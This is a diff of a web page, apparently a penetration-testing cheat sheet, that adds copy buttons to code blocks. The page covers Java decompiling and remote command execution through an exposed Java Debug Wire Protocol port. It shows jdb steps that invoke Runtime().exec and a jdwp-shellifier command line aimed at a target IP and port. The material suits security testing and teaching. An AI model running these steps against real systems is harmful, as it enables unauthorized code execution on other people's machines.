@@ -387,31 +387,40 @@ its graphical interface. I use it with a small codebase</li>
 focused on modern Java features. I use it when JD-Gui got troubles with large or
 new Java codebase.</li>
 </ul>
-<pre><code class="language-bash">java -jar cfr-0.150.jar /path/to/jar --outputdir /path/output/dir
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">java -jar cfr-0.150.jar /path/to/jar --outputdir /path/output/dir
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="java -jar cfr-0.150.jar /path/to/jar --outputdir /path/output/dir
+">    Copy  </button></div></div>
 <h2 id="java-debug-wire-protocol-jdwp">Java Debug Wire Protocol (JDWP)</h2>
 <p><code>JWDP</code> is the protocol used for communication between a debugger and a Java app (JVM).</p>
 <h3 id="manual-exploitation">Manual exploitation</h3>
 <p>It's possible to execute shell commands using <code>jdb</code>:</p>
-<pre><code class="language-bash">jdb -attach 8000
-</code></pre>
+<div class="clipboard-content">  <pre><code class="language-bash">jdb -attach 8000
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="jdb -attach 8000
+">    Copy  </button></div></div>
 <p>Then you need to find a good java thread to stop in and execute you command. It
 appears that the method <code>indexOf</code> of the <code>String</code> class is a good candidate:</p>
-<pre><code class="language-bash">trace go methods
+<div class="clipboard-content">  <pre><code class="language-bash">trace go methods
 # wait that the jdb dies
 stop in java.lang.String().indexOf(int)
 print new java.lang.Runtime().exec(&quot;&lt;cmd&gt;&quot;)
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="trace go methods
+# wait that the jdb dies
+stop in java.lang.String().indexOf(int)
+print new java.lang.Runtime().exec(&quot;&lt;cmd&gt;&quot;)
+">    Copy  </button></div></div>
 <p>This should execute you command with the privilege of the Java application. But
 be careful, the manual method often fails.</p>
 <h3 id="jdwp-shellifier">jdwp-shellifier</h3>
 <p><code>jdwp-shellifier</code> is an exploitation tool to exploit <code>JWDP</code>. It's available on
 <a href="https://github.com/IOActive/jdwp-shellifier" target="_blank">github</a>.</p>
 <p>Again we use the <code>indexOf</code> method to break on, it's possible to use an other one.</p>
-<pre><code class="language-bash">git clone https://github.com/IOActive/jdwp-shellifier
+<div class="clipboard-content">  <pre><code class="language-bash">git clone https://github.com/IOActive/jdwp-shellifier
 cd jdwp-shellifier
 python jdwp-shellifier.py -t &lt;ip&gt; - p &lt;port&gt; --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;&lt;cmd&gt;&quot;
-</code></pre>
+</code></pre>  <div class="clipboard-container"><button class="clipboard-btn" value="git clone https://github.com/IOActive/jdwp-shellifier
+cd jdwp-shellifier
+python jdwp-shellifier.py -t &lt;ip&gt; - p &lt;port&gt; --break-on &quot;java.lang.String.indexOf&quot; --cmd &quot;&lt;cmd&gt;&quot;
+">    Copy  </button></div></div>
             
           </div>
           <footer>
